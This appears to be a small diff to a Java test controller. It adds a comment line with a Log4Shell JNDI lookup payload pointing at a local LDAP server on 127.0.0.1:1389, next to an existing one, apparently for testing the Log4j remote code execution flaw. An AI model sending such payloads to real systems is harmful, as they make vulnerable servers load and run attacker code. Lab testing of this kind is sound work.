@@ -13,6 +13,7 @@ public class TestController {
 
     /**
      * ${jndi:ldap://127.0.0.1:1389/Log4jRCE}
+     * ${jndi:ldap://127.0.0.1:1389/Exploit}
      * @param name
      * @return
      */
